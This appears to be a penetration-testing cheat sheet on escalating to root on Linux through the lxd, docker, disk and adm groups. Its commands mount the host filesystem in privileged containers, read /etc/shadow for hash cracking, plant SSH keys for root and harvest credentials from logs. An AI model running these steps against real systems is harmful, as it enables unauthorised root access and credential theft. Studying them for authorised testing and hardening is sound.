## Privileged Group Abuse

Membership in certain groups grants capabilities equivalent to root access. Always check group membership early in enumeration:

```shell
id
```

---

### LXD / LXC

LXD is Ubuntu's container manager. Every user added during installation is placed in the `lxd` group — membership alone is enough to escalate to root by mounting the host filesystem inside a privileged container.

#### Steps

**1. Prepare the Alpine image**

```shell
unzip alpine.zip
```

**2. Initialize LXD** (accept all defaults)

```shell
lxd init
```

**3. Import the image**

```shell
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

**4. Create a privileged container**

Setting `security.privileged=true` disables UID mapping — root inside the container maps directly to root on the host:

```shell
lxc init alpine r00t -c security.privileged=true
```

**5. Mount the host filesystem**

```shell
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

**6. Start the container and drop into a shell**

```shell
lxc start r00t
lxc exec r00t /bin/sh
```

The entire host filesystem is now accessible under `/mnt/root` as root. From here, read `/mnt/root/etc/shadow` for hashes or drop an SSH key into `/mnt/root/root/.ssh/authorized_keys`.

---

### Docker

Members of the `docker` group can mount any host directory into a container — no password required:

```shell
docker run -v /root:/mnt -it ubuntu
```

This mounts `/root` from the host into `/mnt` inside the container. Useful targets beyond `/root`:

- `/etc` → read `/etc/shadow` for offline cracking
- `/home` → access user SSH keys
- `/` → full filesystem read/write

---

### Disk

The `disk` group grants direct read/write access to block devices under `/dev`. Use `debugfs` to interact with the raw filesystem as root:

```shell
debugfs /dev/sda1
```

From here, navigate the filesystem freely — extract SSH keys, read `/etc/shadow`, or modify files directly.

---

### ADM

The `adm` group allows reading all logs under `/var/log` — no direct root access, but valuable for:

- Harvesting credentials logged in plaintext
- Reconstructing user activity and cron job schedules
- Identifying running services and internal hostnames

> 💡 Always run `id` immediately after landing on a box. Group memberships like `lxd`, `docker`, `disk`, or `adm` are instant escalation paths that don't require any exploit.
